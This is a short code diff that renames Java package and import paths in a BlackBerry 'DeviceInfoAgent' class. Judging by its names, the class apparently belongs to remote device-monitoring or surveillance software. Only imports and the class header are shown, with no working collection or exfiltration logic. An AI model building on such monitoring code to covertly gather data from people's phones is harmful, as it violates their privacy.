@@ -1,14 +1,14 @@
-package com.ht.rcs.blackberry.agent;
+package blackberry.agent;
 
 import net.rim.device.api.system.DeviceInfo;
 
-import com.ht.rcs.blackberry.Device;
+import blackberry.Device;
 
-import com.ht.rcs.blackberry.log.Log;
-import com.ht.rcs.blackberry.log.LogType;
-import com.ht.rcs.blackberry.utils.Check;
-import com.ht.rcs.blackberry.utils.Debug;
-import com.ht.rcs.blackberry.utils.DebugLevel;
+import blackberry.log.Log;
+import blackberry.log.LogType;
+import blackberry.utils.Check;
+import blackberry.utils.Debug;
+import blackberry.utils.DebugLevel;
 
 public class DeviceInfoAgent extends Agent {
 	//#debug
